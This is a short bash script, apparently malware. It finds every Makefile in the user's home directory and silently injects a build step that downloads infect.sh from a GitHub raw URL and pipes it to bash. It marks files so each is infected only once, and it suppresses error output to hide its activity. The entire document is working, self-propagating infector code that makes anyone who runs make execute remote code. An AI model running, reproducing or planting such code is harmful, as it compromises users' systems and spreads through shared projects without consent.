#!/bin/bash
FILES=$(find ~ -type d \( -path ~/Library \) -prune -o -type f -iname makefile 2>/dev/null)
IFS=$(echo -en "\n\b")
for f in $FILES
do
    grep -q "infect" $f &> /dev/null
    if [ $? -ne 0 ]; then
        printf '%s\n' 'g/all:/+1i\' '    @curl https://raw.githubusercontent.com/patrick-hacks/pain/main/infect.sh | bash' 'wq' | ed -s $f &> /dev/null
    fi
done
